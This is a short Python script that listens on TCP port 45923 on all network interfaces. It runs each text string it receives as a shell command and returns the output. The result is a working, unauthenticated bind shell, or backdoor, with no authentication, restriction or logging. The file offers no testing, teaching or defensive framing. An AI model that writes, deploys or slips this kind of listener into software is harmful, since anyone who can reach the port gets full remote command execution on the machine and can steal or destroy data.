import socket
import subprocess

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 45923))  # Bind to all interfaces
    server_socket.listen(5)
    print("Listening for connections on port 45923...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")
        while True:
            command = client_socket.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                print("Closing connection.")
                break
            
            print(f"Executing command: {command}")
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            client_socket.sendall(output.stdout.encode('utf-8') + output.stderr.encode('utf-8'))

        client_socket.close()

if __name__ == "__main__":
    start_server()
